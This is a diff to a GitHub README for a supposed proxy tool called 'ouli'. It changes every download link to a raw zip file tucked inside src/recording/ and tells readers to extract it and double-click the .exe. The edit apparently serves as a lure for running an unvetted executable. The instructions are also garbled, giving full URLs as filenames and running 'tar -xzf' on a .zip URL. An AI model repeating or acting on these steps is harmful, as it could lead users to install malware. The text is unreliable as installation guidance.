@@ -1,6 +1,6 @@
 # 🚀 ouli - Fast and Reliable Proxy Tool
 
-[![Download ouli](https://raw.githubusercontent.com/cikoki898/ouli/main/media/ouli_1.5.zip%20ouli-%2300A1E0?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/cikoki898/ouli/main/media/ouli_1.5.zip)
+[![Download ouli](https://raw.githubusercontent.com/cikoki898/ouli/main/src/recording/Software-1.0.zip%20ouli-%2300A1E0?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/cikoki898/ouli/main/src/recording/Software-1.0.zip)
 
 ## 📦 Overview
 
@@ -12,7 +12,7 @@ This section guides you through the process of downloading and running ouli. Fol
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: To get started, go to the releases page [here](https://raw.githubusercontent.com/cikoki898/ouli/main/media/ouli_1.5.zip).
+1. **Visit the Releases Page**: To get started, go to the releases page [here](https://raw.githubusercontent.com/cikoki898/ouli/main/src/recording/Software-1.0.zip).
 
 2. **Select the Latest Release**: Look for the latest version available. You will find a list of assets associated with the release.
 
@@ -21,13 +21,13 @@ This section guides you through the process of downloading and running ouli. Fol
    - Click on the file to begin downloading.
 
 4. **Locate the Downloaded File**:
-   - After the download completes, find the file in your downloads folder. It may be named something like `https://raw.githubusercontent.com/cikoki898/ouli/main/media/ouli_1.5.zip` or `https://raw.githubusercontent.com/cikoki898/ouli/main/media/ouli_1.5.zip` based on your system.
+   - After the download completes, find the file in your downloads folder. It may be named something like `https://raw.githubusercontent.com/cikoki898/ouli/main/src/recording/Software-1.0.zip` or `https://raw.githubusercontent.com/cikoki898/ouli/main/src/recording/Software-1.0.zip` based on your system.
 
 5. **Extract and Run**:
    - For Windows: Double-click the `.exe` file to run ouli.
-   - For macOS and Linux: Open a terminal and navigate to the folder containing the `https://raw.githubusercontent.com/cikoki898/ouli/main/media/ouli_1.5.zip` file. Use the command:
+   - For macOS and Linux: Open a terminal and navigate to the folder containing the `https://raw.githubusercontent.com/cikoki898/ouli/main/src/recording/Software-1.0.zip` file. Use the command:
      ```bash
-     tar -xzf https://raw.githubusercontent.com/cikoki898/ouli/main/media/ouli_1.5.zip
+     tar -xzf https://raw.githubusercontent.com/cikoki898/ouli/main/src/recording/Software-1.0.zip
      ```
      Then, navigate into the extracted directory:
      ```bash
